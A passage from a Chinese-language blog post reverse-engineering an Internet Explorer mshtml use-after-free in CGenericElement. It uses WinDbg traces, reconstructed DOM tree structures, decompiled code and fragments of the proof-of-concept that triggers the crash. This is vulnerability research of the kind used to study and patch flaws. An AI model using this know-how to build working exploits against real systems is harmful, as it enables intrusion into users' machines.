&apos;mshtml!CreateElement + 0x41 &quot;ln eax;gc&quot;&apos;</span><br><span class="line">0:013&gt; bp 6832d6de+0x37 &quot;ln eax;gc&quot;</span><br><span class="line">0:013&gt; bl</span><br><span class="line"> 0 e 68329ff1     0001 (0001)  0:**** mshtml!CElement::CElement+0x1e &quot;.echo &apos;=== CElement ===&apos;; dd edi l(28/4);gc&quot;</span><br><span class="line"> 1 e 6832d715     0001 (0001)  0:**** mshtml!CreateElement+0x41 &quot;ln eax;gc&quot;</span><br><span class="line">0:013&gt; g</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">073bafd8  681b5570 00000001 00000008 00000000</span><br><span class="line">073bafe8  00000000 00000000 00000000 00000000</span><br><span class="line">073baff8  00000000 00000000</span><br><span class="line">(682f77d2)   mshtml!CCommentElement::CreateElement   |  (682f7880)   mshtml!`string&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CCommentElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">060d0fc8  681b5570 00000001 00000008 00000000</span><br><span class="line">060d0fd8  00000000 00000000 00000000 00000000</span><br><span class="line">060d0fe8  00000000 00000000</span><br><span class="line">(682f77d2)   mshtml!CCommentElement::CreateElement   |  (682f7880)   mshtml!`string&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CCommentElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">06058fc8  681b5570 00000001 00000008 00000000</span><br><span class="line">06058fd8  00000000 00000000 00000000 00000000</span><br><span class="line">06058fe8  00000000 00000000</span><br><span class="line">(682f1547)   mshtml!CHtmlElement::CreateElement   |  (682f1598)   mshtml!CHtmlElement::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CHtmlElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">06c46fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">06c46fe8  00000000 00000000 00000000 00000000</span><br><span class="line">06c46ff8  00000000 00000000</span><br><span class="line">(682f181d)   mshtml!CHeadElement::CreateElement   |  (682f1868)   mshtml!CHeadElement::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CHeadElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07988fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">07988fe8  00000000 00000000 00000000 00000000</span><br><span class="line">07988ff8  00000000 00000000</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">072abfd0  681b5570 00000001 00000008 00000000</span><br><span class="line">072abfe0  00000000 00000000 00000000 00000000</span><br><span class="line">072abff0  00000000 00000000</span><br><span class="line">(682f0bba)   mshtml!CBodyElement::CreateElement   |  (682f0c08)   mshtml!CBodyElement::CBodyElement</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CBodyElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">071f2fd0  681b5570 00000001 00000008 00000000</span><br><span class="line">071f2fe0  00000000 00000000 00000000 00000000</span><br><span class="line">071f2ff0  00000000 00000000</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">0795efd0  681b5570 00000001 00000008 00000000</span><br><span class="line">0795efe0  00000000 00000000 00000000 00000000</span><br><span class="line">0795eff0  00000000 00000000</span><br><span class="line">(682f77d2)   mshtml!CCommentElement::CreateElement   |  (682f7880)   mshtml!`string&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CCommentElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">073a8fc8  681b5570 00000001 00000008 00000000</span><br><span class="line">073a8fd8  00000000 00000000 00000000 00000000</span><br><span class="line">073a8fe8  00000000 00000000</span><br><span class="line">(6834f96d)   mshtml!CScriptElement::CreateElement   |  (6834f9b7)   mshtml!CScriptElement::CScriptElement</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CScriptElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07a94f98  681b5570 00000001 00000008 00000000</span><br><span class="line">07a94fa8  00000000 00000000 00000000 00000000</span><br><span class="line">07a94fb8  00000000 00000000</span><br><span class="line">ModLoad: 6c020000 6c0d2000   C:\Windows\System32\jscript.dll</span><br><span class="line">(682a8f8c)   mshtml!CSpanElement::CreateElement   |  (682a8fd8)   mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CSpanElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07ac1fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">07ac1fe8  00000000 00000000 00000000 00000000</span><br><span class="line">07ac1ff8  00000000 00000000</span><br><span class="line">(682a8f8c)   mshtml!CSpanElement::CreateElement   |  (682a8fd8)   mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CSpanElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07ae1fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">07ae1fe8  00000000 00000000 00000000 00000000</span><br><span class="line">07ae1ff8  00000000 00000000</span><br><span class="line">(682a8f8c)   mshtml!CSpanElement::CreateElement   |  (682a8fd8)   mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CSpanElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07ad7fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">07ad7fe8  00000000 00000000 00000000 00000000</span><br><span class="line">07ad7ff8  00000000 00000000</span><br><span class="line">(682bc4de)   mshtml!CGenericElement::CreateElement   |  (682bc523)   mshtml!CGenericElement::CGenericElement</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CGenericElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">06c81fc8  681b5570 00000001 00000008 00000000</span><br><span class="line">06c81fd8  00000000 00000000 00000000 00000000</span><br><span class="line">06c81fe8  00000000 00000000</span><br><span class="line">(6829a55d)   mshtml!CTable::CreateElement   |  (6829a59e)   mshtml!CTable::CTable</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CTable::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07b82fb8  681b5570 00000001 00000008 00000000</span><br><span class="line">07b82fc8  00000000 00000000 00000000 00000000</span><br><span class="line">07b82fd8  00000000 00000000</span><br><span class="line">(6828d66d)   mshtml!CHRElement::CreateElement   |  (6828d6c3)   mshtml!CHRElement::ApplyDefaultFormat</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CHRElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">06f65fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">06f65fe8  00000000 00000000 00000000 00000000</span><br><span class="line">06f65ff8  00000000 00000000</span><br><span class="line">(6cc.b80): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=686e9100 ebx=0791dfb0 ecx=06c81fc8 edx=00000000 esi=0469d170 edi=00000000</span><br><span class="line">eip=6836b68d esp=0469d144 ebp=0469d15c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246</span><br><span class="line">mshtml!CElement::Doc:</span><br><span class="line">6836b68d 8b01            mov     eax,dword ptr [ecx]  ds:0023:06c81fc8=????????</span><br></pre></td></tr></table></figure></p>
<p>由上可以观察到创建各元素时调用的函数及元素所在内存的值，偏移0为虚表地址，偏移4为引用计数。<br>下面来看下 <code>poc</code> 里的第二个语句。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.appendChild(f0);</span><br></pre></td></tr></table></figure></p>
<p><code>windbg</code> 查看包含 <code>appendChild</code> 的符号。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; x mshtml!*appendChild*</span><br><span class="line">682c5acf mshtml!CElement::appendChild = &lt;no type information&gt;</span><br><span class="line">68511590 mshtml!CAttribute::appendChild = &lt;no type information&gt;</span><br><span class="line">685109f4 mshtml!CDOMTextNode::appendChild = &lt;no type information&gt;</span><br><span class="line">683fd1d8 mshtml!s_methdescCAttributeappendChild = &lt;no type information&gt;</span><br><span class="line">6837d720 mshtml!s_methdescCElementappendChild = &lt;no type information&gt;</span><br><span class="line">682cd65e mshtml!CDocument::appendChild = &lt;no type information&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以猜到处理函数为 <code>mshtml!CElement::appendChild</code>,可以看到这个函数实际上又调用了 <code>CElement::insertBefore</code> 函数。<br><img src="http://static.zybuluo.com/dane909/jrebckmhnrj4bzpxgaf1op7p/32398244444444.png" alt="32398244444444.png-46.5kB"><br>同上面的创建元素的函数一样，又会调用一个 <code>xxxHelper</code> 的函数，如下图。<br><img src="http://static.zybuluo.com/dane909/0nkfu7fo26y0yzsjhmhs7mb1/QQ%E6%88%AA%E5%9B%BE20180712003955.png" alt="QQ截图20180712003955.png-35.9kB"><br>动态分析对 <code>CElement::InsertBeforeHelper</code> 函数功能进行猜测，注释见下图(很多都是猜的，不确定对不对)。<br><img src="http://static.zybuluo.com/dane909/o2tpwf4umn0q549whs7ustpu/42304982309480329llll.png" alt="42304982309480329llll.png-140.7kB"><br>跟进函数 <code>sub_686659BA</code>,调试信息如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; </span><br><span class="line">eax=0487cfac ebx=05f9ef30 ecx=00000000 edx=00000000 esi=05f1afd0 edi=0766bfd8</span><br><span class="line">eip=686659cb esp=0487cf10 ebp=0487cf90 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CCommentElement::`scalar deleting destructor&apos;+0x18d:</span><br><span class="line">686659cb 8bcf            mov     ecx,edi</span><br><span class="line">0:005&gt; ln poi(edi)</span><br><span class="line">(68648fd8)   mshtml!CSpanElement::`vftable&apos;   |  (685573d8)   mshtml!CBlockElement::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CSpanElement::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=0487cfac ebx=05f9ef30 ecx=0766bfd8 edx=00000000 esi=05f1afd0 edi=0766bfd8</span><br><span class="line">eip=686659cd esp=0487cf10 ebp=0487cf90 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CCommentElement::`scalar deleting destructor&apos;+0x18f:</span><br><span class="line">686659cd e8bb5c0a00      call    mshtml!CElement::Doc (6870b68d)</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=05b8b680 ebx=05f9ef30 ecx=0766bfd8 edx=6870b65d esi=05f1afd0 edi=0766bfd8</span><br><span class="line">eip=686659d2 esp=0487cf10 ebp=0487cf90 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CCommentElement::`scalar deleting destructor&apos;+0x194:</span><br><span class="line">686659d2 8b4f1c          mov     ecx,dword ptr [edi+1Ch] ds:0023:0766bff4=00010000</span><br><span class="line">0:005&gt; ln poi(eax)</span><br><span class="line">(68702028)   mshtml!CDoc::`vftable&apos;   |  (6870fc58)   mshtml!CDoc::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CDoc::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=05b8b680 ebx=05f9ef30 ecx=00010000 edx=6870b65d esi=05f1afd0 edi=0766bfd8</span><br><span class="line">eip=686659d5 esp=0487cf10 ebp=0487cf90 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CCommentElement::`scalar deleting destructor&apos;+0x197:</span><br><span class="line">686659d5 c1e909          shr     ecx,9</span><br></pre></td></tr></table></figure></p>
<p>通过 <code>mshtml!CElement::Doc</code> 函数获取 <code>CDoc</code>,在这里表示 <code>html</code> 文档，用于下面的插入，继续跟，发现在跳转后又调用了 <code>CDoc::InsertElement</code> 函数。<br><img src="http://static.zybuluo.com/dane909/tcdd0sfbumapox9u7gi5l2oj/QQ%E6%88%AA%E5%9B%BE20180712133222.png" alt="QQ截图20180712133222.png-54.6kB"><br>继续分析， 两次调用 <code>CTreePosGap::MoveTo</code> 函数应该是确定插入的开始和结束位置。之后又调用了 <code>CMarkup::InsertElementInternal</code> 函数。<br><img src="http://static.zybuluo.com/dane909/8s9n2fj1qqc6e05605fakzpw/QQ%E6%88%AA%E5%9B%BE20180712142633.png" alt="QQ截图20180712142633.png-63.2kB"><br>太菜，已经逆到吐，就把函数的功能贴出来吧。<code>CMarkup::InsertElementInternal</code> 函数会在 <code>DOM</code> 树搜索准备插入的分支节点，之后调用 <code>CTreeNode::CTreeNode</code> 构建添加元素的 <code>DOM</code> 节点。<br><img src="http://static.zybuluo.com/dane909/wfluhdmjvhvansghj04yqvmv/QQ%E6%88%AA%E5%9B%BE20180712143816.png" alt="QQ截图20180712143816.png-7.1kB"><br><code>CTreeNode</code> 数据结构大致如下(参考:<a href="https://www.jianshu.com/p/8cd37ffe9a98" target="_blank" rel="noopener">IE DOM 树概览</a>)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTreeNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line">    CElement * element;</span><br><span class="line">    CTreeNode * parent;</span><br><span class="line">    BYTE        _etag;                              <span class="comment">// 0-7:     element tag</span></span><br><span class="line">    BYTE        _fFirstCommonAncestorNode : <span class="number">1</span>;    <span class="comment">// 8:       for finding common ancestor</span></span><br><span class="line">    BYTE        _fInMarkup : <span class="number">1</span>;    <span class="comment">// 9:       this node is in a markup and shouldn't die</span></span><br><span class="line">    BYTE        _fInMarkupDestruction : <span class="number">1</span>;    <span class="comment">// 10:      Used by CMarkup::DestroySplayTree</span></span><br><span class="line">    BYTE        _fHasLookasidePtr : <span class="number">2</span>;    <span class="comment">// 11-12    Lookaside flags</span></span><br><span class="line">    BYTE        _fBlockNess : <span class="number">1</span>;    <span class="comment">// 13:      Cached from format -- valid if _iFF != -1</span></span><br><span class="line">    BYTE        _fHasLayout : <span class="number">1</span>;    <span class="comment">// 14:      Cached from format -- valid if _iFF != -1</span></span><br><span class="line">    BYTE        _fUnused : <span class="number">1</span>;    <span class="comment">// 15:      Unused</span></span><br><span class="line">    SHORT       _iPF;                               <span class="comment">// 16-31:   Paragraph Format</span></span><br><span class="line">                                                <span class="comment">// DWORD 2</span></span><br><span class="line">    SHORT       _iCF;                               <span class="comment">// 0-15:    Char Format</span></span><br><span class="line">    SHORT       _iFF;</span><br><span class="line"></span><br><span class="line">    CTreePos    _tpBegin;</span><br><span class="line">    CTreePos    _tpEnd;</span><br><span class="line">    DWORD      unknow1;</span><br><span class="line">    DWORD      unknow2;</span><br><span class="line">    DWORD      unknow3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>每创建一个元素都会创建相应的 <code>CTreeNode</code>，存储着元素的相关信息，并通过 <code>CTreePos</code> 对象构成 <code>DOM</code> 树。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTreePos</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    DWORD       _cElemLeftAndFlags; </span><br><span class="line">    DWORD       _cchLeft;           <span class="comment">// 左子树中的字符数量</span></span><br><span class="line">    CTreePos*   _pFirstChild;      </span><br><span class="line">    CTreePos*   _pNext;           </span><br><span class="line">    CTreePos*   _pLeft;              <span class="comment">//  当前 CTreePos 在 DOM 流中的左边</span></span><br><span class="line">    CTreePos*   _pRight;            <span class="comment">//  当前 CTreePos 在 DOM 流中的右边</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>下面通过 <code>windbg</code> 调试观察 <code>CTreeNode</code> 和相应元素创建时在内存中的关系，调试信息如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">0:012&gt; bu mshtml!CElement::CElement+0x1e &quot;.echo &apos;=== CElement ===&apos;; dd edi l(28/4);gc&quot;</span><br><span class="line">0:012&gt; bu mshtml!CreateElement + 0x41 &quot;ln eax;gc&quot;</span><br><span class="line">Matched: 682f141a mshtml!CreateElement = &lt;no type information&gt;</span><br><span class="line">Matched: 6832d6de mshtml!CreateElement = &lt;no type information&gt;</span><br><span class="line">Ambiguous symbol error at &apos;mshtml!CreateElement + 0x41 &quot;ln eax;gc&quot;&apos;</span><br><span class="line">0:012&gt; bu 6832d6de  + 0x41 &quot;ln eax;gc&quot;</span><br><span class="line">0:012&gt; bu mshtml!CMarkup::InsertElementInternal+1ec &quot;.echo &apos;=== CTreeNode ===&apos;; dd eax L1; dps poi(eax) L1;gc&quot;</span><br><span class="line">0:012&gt; g</span><br><span class="line">............................</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">05ca1fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">05ca1fe8  00000000 00000000 00000000 00000000</span><br><span class="line">05ca1ff8  00000000 00000000</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">07b3cfb0  05ca1fd8</span><br><span class="line">05ca1fd8  682a8fd8 mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07b6efd8  681b5570 00000001 00000008 00000000</span><br><span class="line">07b6efe8  00000000 00000000 00000000 00000000</span><br><span class="line">07b6eff8  00000000 00000000</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">053d6fb0  07b6efd8</span><br><span class="line">07b6efd8  682a8fd8 mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07b46fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">07b46fe8  00000000 00000000 00000000 00000000</span><br><span class="line">07b46ff8  00000000 00000000</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">06bf6fb0  07b46fd8</span><br><span class="line">07b46fd8  682a8fd8 mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">06c68fc8  681b5570 00000001 00000008 00000000</span><br><span class="line">06c68fd8  00000000 00000000 00000000 00000000</span><br><span class="line">06c68fe8  00000000 00000000</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">042f2fb0  06c68fc8</span><br><span class="line">06c68fc8  682bc590 mshtml!CGenericElement::`vftable&apos;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">08177fb8  681b5570 00000001 00000008 00000000</span><br><span class="line">08177fc8  00000000 00000000 00000000 00000000</span><br><span class="line">08177fd8  00000000 00000000</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">07b34fb0  08177fb8</span><br><span class="line">08177fb8  681b6488 mshtml!CTable::`vftable&apos;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">05ca7fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">05ca7fe8  00000000 00000000 00000000 00000000</span><br><span class="line">05ca7ff8  00000000 00000000</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">05feffb0  05ca7fd8</span><br><span class="line">05ca7fd8  681b9250 mshtml!CHRElement::`vftable&apos;</span><br><span class="line">(ae4.dc8): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=686e9100 ebx=042f2fb0 ecx=06c68fc8 edx=00000000 esi=0486cd10 edi=00000000</span><br><span class="line">eip=6836b68d esp=0486cce4 ebp=0486ccfc iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246</span><br><span class="line">mshtml!CElement::Doc:</span><br><span class="line">6836b68d 8b01            mov     eax,dword ptr [ecx]  ds:0023:06c68fc8=????????</span><br></pre></td></tr></table></figure></p>
<p>可以看到 <code>CTreeNode</code> 的开始存放的是 <code>element</code> 的地址，和 <code>CTreeNode</code> 的数据结构吻合。元素对象的开始四字节是对应元素的虚表地址，第二个四字节是引用计数。下面继续分析 <code>poc</code> 里的 <code>offsetParent</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f0.offsetParent=null;</span><br></pre></td></tr></table></figure></p>
<p><code>windbg</code> 搜索 <code>offsetParent</code> 的相关函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; x mshtml!*offsetParent*</span><br><span class="line">681e128e mshtml!CDisplayRequestGetOffsetParent::~CDisplayRequestGetOffsetParent = &lt;no type information&gt;</span><br><span class="line">681e11ca mshtml!CDisplayRequestGetOffsetParent::CDisplayRequestGetOffsetParent = &lt;no type information&gt;</span><br><span class="line">681e16cd mshtml!CDisplayBox::IsOffsetParent = &lt;no type information&gt;</span><br><span class="line">681e1709 mshtml!CDisplayBox::FindOffsetParent = &lt;no type information&gt;</span><br><span class="line">681d9d65 mshtml!CDisplayRequestGetOffsetParent::GetOffsetTopLeft = &lt;no type information&gt;</span><br><span class="line">681e12b3 mshtml!CLayoutBlock::IsOffsetParent = &lt;no type information&gt;</span><br><span class="line">681e1915 mshtml!CDisplayRequestGetOffsetParent::SetOffsetParentDisplayBox = &lt;no type information&gt;</span><br><span class="line">681e11e3 mshtml!CDisplayRequestGetOffsetParent::OffsetParent = &lt;no type information&gt;</span><br><span class="line">682bcd62 mshtml!CElement::GetOffsetParentHelper = &lt;no type information&gt;</span><br><span class="line">681e19b1 mshtml!CTextDisplayBox::IsOffsetParent = &lt;no type information&gt;</span><br><span class="line">6837c914 mshtml!s_propdescCElementoffsetParent = &lt;no type information&gt;</span><br><span class="line">681e192d mshtml!CDisplayRequestGetOffsetParent::SetSourceDisplayBox = &lt;no type information&gt;</span><br><span class="line">682bd418 mshtml!CElement::get_offsetParent = &lt;no type information&gt;</span><br><span class="line">681e1798 mshtml!CDisplayBox::TransformRectToOffsetParent = &lt;no type information&gt;</span><br></pre></td></tr></table></figure></p>
<p>由上面的信息可以猜测到 <code>offsetParent</code> 和函数 <code>mshtml!CElement::get_offsetParent</code> 及 <code>mshtml!CElement::GetOffsetParentHelper</code> 有关系。实际上 <code>CElement::get_offsetParent</code> 中调用了 <code>CElement::GetOffsetParentHelper</code>。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __thiscall CElement::get_offsetParent(CElement *ecx0, CElement *<span class="keyword">this</span>, struct IHTMLElement **a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">CTreeNode</span> *<span class="title">v4</span>;</span> <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_DWORD *)<span class="keyword">this</span> + <span class="number">5</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *a3 = <span class="number">0</span>;</span><br><span class="line">      v4 = CElement::GetOffsetParentHelper(ecx0);</span><br><span class="line">      <span class="keyword">if</span> ( v4 &amp;&amp; *((_BYTE *)v4 + <span class="number">8</span>) != <span class="number">82</span> )</span><br><span class="line">        v3 = CTreeNode::GetElementInterface(v4, &amp;IID_IHTMLElement, (<span class="keyword">void</span> **)a3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">-2147467259</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">-2147467261</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> CBase::SetErrorInfo(ecx0, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>在 <code>poc</code> 分析的时候已经可以得到漏洞是由于 <code>CGenericElement</code> 在释放后又被引用导致的，一般会发生在下面两种情况下。</p>
<blockquote>
<ul>
<li><code>CGenericElement</code> 对象的指针存储到 <code>CTreeNode</code> 结构中时，<code>CGenericElement</code> 的引用计数没有加一, 导致<code>CGenericElement</code> 提前释放。</li>
